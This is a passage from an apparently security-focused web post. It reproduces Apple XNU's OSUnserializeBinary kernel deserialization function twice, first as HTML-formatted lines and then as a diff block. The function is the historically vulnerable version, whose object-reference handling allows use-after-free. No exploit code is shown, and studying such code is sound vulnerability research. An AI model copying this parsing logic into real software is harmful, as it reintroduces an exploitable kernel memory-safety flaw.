class="line">	next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</div><div class="line"></div><div class="line">	DEBG(&quot;---------OSUnserializeBinary(%p)\n&quot;, buffer);</div><div class="line"></div><div class="line">	objsArray = stackArray    = NULL;</div><div class="line">	objsIdx   = objsCapacity  = 0;</div><div class="line">	stackIdx  = stackCapacity = 0;</div><div class="line"></div><div class="line">    result   = 0;</div><div class="line">    parent   = 0;</div><div class="line">	dict     = 0;</div><div class="line">	array    = 0;</div><div class="line">	set      = 0;</div><div class="line">	sym      = 0;</div><div class="line"></div><div class="line">	ok = true;</div><div class="line">	while (ok)</div><div class="line">	&#123;</div><div class="line">		bufferPos += sizeof(*next);</div><div class="line">		if (!(ok = (bufferPos &lt;= bufferSize))) break;</div><div class="line">		key = *next++;</div><div class="line"></div><div class="line">        len = (key &amp; kOSSerializeDataMask);</div><div class="line">        wordLen = (len + 3) &gt;&gt; 2;</div><div class="line">		end = (0 != (kOSSerializeEndCollecton &amp; key));</div><div class="line">        DEBG(&quot;key 0x%08x: 0x%04x, %d\n&quot;, key, len, end);</div><div class="line"></div><div class="line">        newCollect = isRef = false;</div><div class="line">		o = 0; newDict = 0; newArray = 0; newSet = 0;</div><div class="line">		</div><div class="line">		switch (kOSSerializeTypeMask &amp; key)</div><div class="line">		&#123;</div><div class="line">		    case kOSSerializeDictionary:</div><div class="line">				o = newDict = OSDictionary::withCapacity(len);</div><div class="line">				newCollect = (len != 0);</div><div class="line">		        break;</div><div class="line">		    case kOSSerializeArray:</div><div class="line">				o = newArray = OSArray::withCapacity(len);</div><div class="line">				newCollect = (len != 0);</div><div class="line">		        break;</div><div class="line">		    case kOSSerializeSet:</div><div class="line">				o = newSet = OSSet::withCapacity(len);</div><div class="line">				newCollect = (len != 0);</div><div class="line">		        break;</div><div class="line"></div><div class="line">		    case kOSSerializeObject:</div><div class="line">				if (len &gt;= objsIdx) break;</div><div class="line">				o = objsArray[len];</div><div class="line">				o-&gt;retain();</div><div class="line">				isRef = true;</div><div class="line">				break;</div><div class="line"></div><div class="line">		    case kOSSerializeNumber:</div><div class="line">				bufferPos += sizeof(long long);</div><div class="line">				if (bufferPos &gt; bufferSize) break;</div><div class="line">		    	value = next[1];</div><div class="line">		    	value &lt;&lt;= 32;</div><div class="line">		    	value |= next[0];</div><div class="line">		    	o = OSNumber::withNumber(value, len);</div><div class="line">		    	next += 2;</div><div class="line">		        break;</div><div class="line"></div><div class="line">		    case kOSSerializeSymbol:</div><div class="line">				bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">				if (bufferPos &gt; bufferSize)           break;</div><div class="line">				if (0 != ((const char *)next)[len-1]) break;</div><div class="line">		        o = (OSObject *) OSSymbol::withCString((const char *) next);</div><div class="line">		        next += wordLen;</div><div class="line">		        break;</div><div class="line"></div><div class="line">		    case kOSSerializeString:</div><div class="line">				bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">				if (bufferPos &gt; bufferSize) break;</div><div class="line">		        o = OSString::withStringOfLength((const char *) next, len);</div><div class="line">		        next += wordLen;</div><div class="line">		        break;</div><div class="line"></div><div class="line">    	    case kOSSerializeData:</div><div class="line">				bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">				if (bufferPos &gt; bufferSize) break;</div><div class="line">		        o = OSData::withBytes(next, len);</div><div class="line">		        next += wordLen;</div><div class="line">		        break;</div><div class="line"></div><div class="line">    	    case kOSSerializeBoolean:</div><div class="line">				o = (len ? kOSBooleanTrue : kOSBooleanFalse);</div><div class="line">		        break;</div><div class="line"></div><div class="line">		    default:</div><div class="line">		        break;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if (!(ok = (o != 0))) break;</div><div class="line"></div><div class="line">		if (!isRef)</div><div class="line">		&#123;</div><div class="line">			setAtIndex(objs, objsIdx, o);</div><div class="line">			if (!ok) break;</div><div class="line">			objsIdx++;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if (dict)</div><div class="line">		&#123;</div><div class="line">			if (sym)</div><div class="line">			&#123;</div><div class="line">				DEBG(&quot;%s = %s\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</div><div class="line">				if (o != dict) ok = dict-&gt;setObject(sym, o);</div><div class="line">				o-&gt;release();</div><div class="line">				sym-&gt;release();</div><div class="line">				sym = 0;</div><div class="line">			&#125;</div><div class="line">			else </div><div class="line">			&#123;</div><div class="line">				sym = OSDynamicCast(OSSymbol, o);</div><div class="line">				ok = (sym != 0);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		else if (array) </div><div class="line">		&#123;</div><div class="line">			ok = array-&gt;setObject(o);</div><div class="line">		    o-&gt;release();</div><div class="line">		&#125;</div><div class="line">		else if (set)</div><div class="line">		&#123;</div><div class="line">		   ok = set-&gt;setObject(o);</div><div class="line">		   o-&gt;release();</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">		    assert(!parent);</div><div class="line">		    result = o;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if (!ok) break;</div><div class="line"></div><div class="line">		if (newCollect)</div><div class="line">		&#123;</div><div class="line">			if (!end)</div><div class="line">			&#123;</div><div class="line">				stackIdx++;</div><div class="line">				setAtIndex(stack, stackIdx, parent);</div><div class="line">				if (!ok) break;</div><div class="line">			&#125;</div><div class="line">			DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">			parent = o;</div><div class="line">			dict   = newDict;</div><div class="line">			array  = newArray;</div><div class="line">			set    = newSet;</div><div class="line">			end    = false;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if (end)</div><div class="line">		&#123;</div><div class="line">			if (!stackIdx) break;</div><div class="line">			parent = stackArray[stackIdx];</div><div class="line">			DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">			stackIdx--;</div><div class="line">			set   = 0; </div><div class="line">			dict  = 0; </div><div class="line">			array = 0;</div><div class="line">			if (!(dict = OSDynamicCast(OSDictionary, parent)))</div><div class="line">			&#123;</div><div class="line">				if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	DEBG(&quot;ret %p\n&quot;, result);</div><div class="line"></div><div class="line">	if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</div><div class="line">	if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</div><div class="line"></div><div class="line">	if (!ok &amp;&amp; result)</div><div class="line">	&#123;</div><div class="line">		result-&gt;release();</div><div class="line">		result = 0;</div><div class="line">	&#125;</div><div class="line">	return (result);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+    OSObject ** stackArray;
+    uint32_t    stackCapacity;
+    uint32_t    stackIdx;
 
+    OSObject     * result;
+    OSObject     * parent;
+    OSDictionary * dict;
+    OSArray      * array;
+    OSSet        * set;
+    OSDictionary * newDict;
+    OSArray      * newArray;
+    OSSet        * newSet;
+    OSObject     * o;
+    OSSymbol     * sym;
+
+    size_t           bufferPos;
+    const uint32_t * next;
+    uint32_t         key, len, wordLen;
+    bool             end, newCollect, isRef;
+    unsigned long long value;
+    bool ok;
+
+    if (errorString) *errorString = 0;
+    if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);
+    if (3 &amp; ((uintptr_t) buffer)) return (NULL);
+    if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);
+    bufferPos = sizeof(kOSSerializeBinarySignature);
+    next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);
+
+    DEBG(&quot;---------OSUnserializeBinary(%p)\n&quot;, buffer);
+
+    objsArray = stackArray    = NULL;
+    objsIdx   = objsCapacity  = 0;
+    stackIdx  = stackCapacity = 0;
+
+    result   = 0;
+    parent   = 0;
+    dict     = 0;
+    array    = 0;
+    set      = 0;
+    sym      = 0;
+
+    ok = true;
+    while (ok)
+    {
+        bufferPos += sizeof(*next);
+        if (!(ok = (bufferPos &lt;= bufferSize))) break;
+        key = *next++;
+
+        len = (key &amp; kOSSerializeDataMask);
+        wordLen = (len + 3) &gt;&gt; 2;
+        end = (0 != (kOSSerializeEndCollecton &amp; key));
+        DEBG(&quot;key 0x%08x: 0x%04x, %d\n&quot;, key, len, end);
+
+        newCollect = isRef = false;
+        o = 0; newDict = 0; newArray = 0; newSet = 0;
+
+        switch (kOSSerializeTypeMask &amp; key)
+        {
+            case kOSSerializeDictionary:
+                o = newDict = OSDictionary::withCapacity(len);
+                newCollect = (len != 0);
+                break;
+            case kOSSerializeArray:
+                o = newArray = OSArray::withCapacity(len);
+                newCollect = (len != 0);
+                break;
+            case kOSSerializeSet:
+                o = newSet = OSSet::withCapacity(len);
+                newCollect = (len != 0);
+                break;
+
+            case kOSSerializeObject:
+                if (len &gt;= objsIdx) break;
+                o = objsArray[len];
+                o-&gt;retain();
+                isRef = true;
+                break;
+
+            case kOSSerializeNumber:
+                bufferPos += sizeof(long long);
+                if (bufferPos &gt; bufferSize) break;
+                value = next[1];
+                value &lt;&lt;= 32;
+                value |= next[0];
+                o = OSNumber::withNumber(value, len);
+                next += 2;
+                break;
+
+            case kOSSerializeSymbol:
+                bufferPos += (wordLen * sizeof(uint32_t));
+                if (bufferPos &gt; bufferSize)           break;
+                if (0 != ((const char *)next)[len-1]) break;
+                o = (OSObject *) OSSymbol::withCString((const char *) next);
+                next += wordLen;
+                break;
+
+            case kOSSerializeString:
+                bufferPos += (wordLen * sizeof(uint32_t));
+                if (bufferPos &gt; bufferSize) break;
+                o = OSString::withStringOfLength((const char *) next, len);
+                next += wordLen;
+                break;
+
+            case kOSSerializeData:
+                bufferPos += (wordLen * sizeof(uint32_t));
+                if (bufferPos &gt; bufferSize) break;
+                o = OSData::withBytes(next, len);
+                next += wordLen;
+                break;
+
+            case kOSSerializeBoolean:
+                o = (len ? kOSBooleanTrue : kOSBooleanFalse);
+                break;
+
+            default:
+                break;
+        }
+
+        if (!(ok = (o != 0))) break;
+
+        if (!isRef)
+        {
+            setAtIndex(objs, objsIdx, o);
+            if (!ok) break;
+            objsIdx++;
+        }
+
+        if (dict)
+        {
+            if (sym)
+            {
+                DEBG(&quot;%s = %s\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());
+                if (o != dict) ok = dict-&gt;setObject(sym, o);
+                o-&gt;release();
+                sym-&gt;release();
+                sym = 0;
+            }
+            else 
+            {
+                sym = OSDynamicCast(OSSymbol, o);
+                ok = (sym != 0);
+            }
+        }
+        else if (array) 
+        {
+            ok = array-&gt;setObject(o);
+            o-&gt;release();
+        }
+        else if (set)
+        {
+           ok = set-&gt;setObject(o);
+           o-&gt;release();
+        }
+        else
+        {
+            assert(!parent);
+            result = o;
+        }
+
+        if (!ok) break;
+
+        if (newCollect)
+        {
+            if (!end)
+            {
+                stackIdx++;
+                setAtIndex(stack, stackIdx, parent);
+                if (!ok) break;
+            }
+            DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);
+            parent = o;
+            dict   = newDict;
+            array  = newArray;
+            set    = newSet;
+            end    = false;
+        }
+
+        if (end)
+        {
+            if (!stackIdx) break;
+            parent = stackArray[stackIdx];
+            DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);
+            stackIdx--;
+            set   = 0; 
+            dict  = 0; 
+            array = 0;
+            if (!(dict = OSDynamicCast(OSDictionary, parent)))
+            {
+                if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));
+            }
+        }
+    }
+    DEBG(&quot;ret %p\n&quot;, result);
+
+    if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));
+    if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));
+
+    if (!ok &amp;&amp; result)
+    {
+        result-&gt;release();
+        result = 0;
+    }
+    return (result);
+}
+</code></pre>
         </div>
         <div class="post-reply">
             
